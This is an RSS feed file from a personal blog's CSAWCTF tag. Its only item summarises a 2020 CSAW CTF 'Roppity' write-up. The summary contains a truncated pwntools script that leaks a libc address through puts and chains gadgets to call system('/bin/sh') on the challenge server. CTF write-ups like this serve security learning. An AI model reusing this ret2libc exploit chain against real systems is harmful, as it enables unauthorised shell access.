@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CSAWCTF on DH.J</title>
+    <link>https://blog.jhyeon.dev/tags/csawctf/</link>
+    <description>Recent content in CSAWCTF on DH.J</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Mon, 14 Sep 2020 00:00:00 +0900</lastBuildDate><atom:link href="https://blog.jhyeon.dev/tags/csawctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>2020 CSAWCTF Roppity Write up</title>
+      <link>https://blog.jhyeon.dev/posts/20200914_csawctf/</link>
+      <pubDate>Mon, 14 Sep 2020 00:00:00 +0900</pubDate>
+      
+      <guid>https://blog.jhyeon.dev/posts/20200914_csawctf/</guid>
+      <description>Roppity Exploit #!/usr/bin/python3 from pwn import * p = remote(&amp;#39;pwn.chal.csaw.io&amp;#39;,5016) e = ELF(&amp;#39;./rop&amp;#39;) libc = ELF(&amp;#39;./libc-2.27.so&amp;#39;) pr = 0x0000000000400683 # pop rdi ret ret = 0x000000000040048e # ret puts_plt = e.plt[&amp;#39;puts&amp;#39;] puts_got = e.got[&amp;#39;puts&amp;#39;] main = e.symbols[&amp;#39;main&amp;#39;] puts_offset = libc.symbols[&amp;#39;puts&amp;#39;] system_offset = libc.symbols[&amp;#39;system&amp;#39;] binsh_offset = next(libc.search(&amp;#34;/bin/sh&amp;#34;)) payload = &amp;#34;A&amp;#34;*40 # 32byte + 8 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main) p.sendlineafter(&amp;#34;\n&amp;#34;, payload) puts_addr = u64(p.recv(6).ljust(8,&amp;#34;\x00&amp;#34;)) libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset payload = &amp;#34;A&amp;#34;*40 payload += p64(pr) payload += p64(binsh_addr) payload += p64(ret) payload += p64(system_addr) p.</description>
+    </item>
+    
+  </channel>
+</rss>
